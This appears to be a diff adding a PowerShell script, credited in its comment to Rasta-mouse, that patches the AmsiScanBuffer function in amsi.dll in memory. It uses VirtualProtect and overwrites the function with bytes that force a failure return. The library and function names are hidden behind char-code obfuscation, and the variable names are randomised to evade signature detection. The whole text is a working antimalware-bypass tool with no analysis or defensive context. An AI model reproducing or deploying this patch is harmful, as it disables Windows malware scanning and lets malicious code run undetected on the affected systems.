@@ -1,0 +1,28 @@
+#Rasta-mouses Amsi-Scan-Buffer patch \n
+$dkuuy = @"
+using System;
+using System.Runtime.InteropServices;
+public class dkuuy {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr khnkac, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type $dkuuy
+
+$krfmuar = [dkuuy]::LoadLibrary("$([ChAR]([ByTe]0x61)+[ChaR]([bYTE]0x6d)+[chAR]([bYTe]0x73)+[CHaR](105*95/95)+[chAR](46)+[ChaR](100+63-63)+[ChaR]([byTe]0x6c)+[CHAr](108+68-68))")
+$rtziar = [dkuuy]::GetProcAddress($krfmuar, "$([chaR]([ByTE]0x41)+[char](59+50)+[ChAR]([BYte]0x73)+[char]([bYTE]0x69)+[CHaR]([byte]0x53)+[CHar](99*21/21)+[cHaR](97+35-35)+[CHAr]([bYTE]0x6e)+[ChAr](66)+[chaR]([BYtE]0x75)+[cHaR]([BYtE]0x66)+[ChAR](102*48/48)+[CHaR]([BytE]0x65)+[chAR]([byTe]0x72))")
+$p = 0
+[dkuuy]::VirtualProtect($rtziar, [uint32]5, 0x40, [ref]$p)
+$qata = "0xB8"
+$mnhp = "0x57"
+$idlc = "0x00"
+$ravr = "0x07"
+$pkgj = "0x80"
+$culb = "0xC3"
+$kqoms = [Byte[]] ($qata,$mnhp,$idlc,$ravr,+$pkgj,+$culb)
+[System.Runtime.InteropServices.Marshal]::Copy($kqoms, 0, $rtziar, 6)
